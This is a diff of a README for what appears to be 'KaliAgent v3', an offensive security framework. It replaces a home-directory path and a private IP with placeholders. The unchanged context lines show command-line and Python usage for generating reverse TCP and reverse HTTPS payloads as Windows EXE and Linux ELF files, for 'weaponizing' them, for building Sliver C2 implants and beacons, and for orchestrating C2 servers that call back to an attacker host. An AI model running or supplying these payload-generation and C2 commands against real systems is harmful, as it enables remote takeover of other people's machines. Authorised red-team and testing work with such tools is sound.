@@ -52,7 +52,7 @@ KaliAgent v3 is a comprehensive security automation framework that provides:
 
 ```bash
 # Navigate to project directory
-cd /home/wez/stsgym-work/agentic_ai
+cd /home/user/agentic-ai/agentic_ai
 
 # Verify Python version
 python3 --version  # Should be 3.10+
@@ -264,7 +264,7 @@ if not authorized:
 ```bash
 # Generate Windows reverse TCP
 python3 -m kali_agent_v3.weaponization.payload_generator \
-  --lhost 192.168.1.100 \
+  --lhost 192.0.2.100 \
   --lport 4444 \
   --type reverse_tcp \
   --format exe \
@@ -272,7 +272,7 @@ python3 -m kali_agent_v3.weaponization.payload_generator \
 
 # Generate Linux reverse HTTPS
 python3 -m kali_agent_v3.weaponization.payload_generator \
-  --lhost 192.168.1.100 \
+  --lhost 192.0.2.100 \
   --lport 443 \
   --type reverse_https \
   --format elf \
@@ -280,7 +280,7 @@ python3 -m kali_agent_v3.weaponization.payload_generator \
 
 # Generate multi-platform
 python3 -m kali_agent_v3.weaponization.payload_generator \
-  --lhost 192.168.1.100 \
+  --lhost 192.0.2.100 \
   --lport 4444 \
   --multi
 ```
@@ -297,7 +297,7 @@ config = PayloadConfig(
     format=PayloadFormat.EXE,
     architecture=Architecture.X64,
     platform=Platform.WINDOWS,
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=4444
 )
 
@@ -406,7 +406,7 @@ for result in report.test_results:
 python3 -m kali_agent_v3.weaponization.weaponization_engine \
   --quick \
   --name my_payload \
-  --lhost 192.168.1.100 \
+  --lhost 192.0.2.100 \
   --lport 4444 \
   --platform windows
 
@@ -427,7 +427,7 @@ engine = WeaponizationEngine()
 # Quick weaponize
 report = engine.quick_weaponize(
     name='my_payload',
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=4444,
     platform=Platform.WINDOWS
 )
@@ -455,13 +455,13 @@ python3 -m kali_agent_v3.c2.sliver_client \
 # Generate implant
 python3 -m kali_agent_v3.c2.sliver_client \
   --generate reverse_https \
-  --lhost 192.168.1.100 \
+  --lhost 192.0.2.100 \
   --lport 443
 
 # Generate beacon
 python3 -m kali_agent_v3.c2.sliver_client \
   --beacon beacon_1 \
-  --lhost 192.168.1.100 \
+  --lhost 192.0.2.100 \
   --lport 443
 
 # List implants
@@ -515,7 +515,7 @@ python3 -m kali_agent_v3.c2.empire_client --list-modules
 python3 -m kali_agent_v3.c2.orchestration \
   --add-server sliver_1 \
   --framework sliver \
-  --host 192.168.1.100 \
+  --host 192.0.2.100 \
   --port 31337
 
 # Connect to server
